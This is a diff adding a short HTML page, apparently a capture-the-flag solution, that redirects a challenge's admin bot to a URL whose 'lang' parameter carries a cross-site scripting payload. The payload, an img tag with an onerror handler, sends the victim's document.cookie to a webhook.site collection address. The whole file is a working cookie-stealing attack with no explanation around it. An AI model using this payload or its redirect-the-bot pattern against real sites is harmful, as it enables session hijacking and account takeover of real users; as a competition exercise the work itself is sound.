@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Redirecting...</title>
+    <script>
+      // Payload: uses img + onerror + document.cookie
+      const payload = `<img src=x onerror=location.href='https://webhook.site/0084921d-f965-4a88-aa8b-bd2c25e26d82?cookie=' + document.cookie>`;
+
+      // Target URL with lang param carrying our payload
+      const redirectTo = "https://chal2.lagncra.sh:8426/zone?lang=" + encodeURIComponent(payload);
+
+      // Redirect the bot
+      window.location.href = redirectTo;
+    </script>
+  </head>
+  <body>
+    Redirecting bot to challenge...
+  </body>
+</html>
+
